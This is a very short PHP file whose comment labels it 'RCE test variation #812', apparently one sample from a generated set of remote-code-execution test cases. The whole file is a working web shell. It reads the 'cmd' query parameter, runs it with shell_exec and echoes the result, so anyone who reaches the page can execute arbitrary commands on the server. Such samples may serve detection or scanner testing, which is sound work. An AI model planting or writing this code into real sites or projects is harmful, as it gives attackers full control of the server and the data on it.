<?php
// RCE test variation #812
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>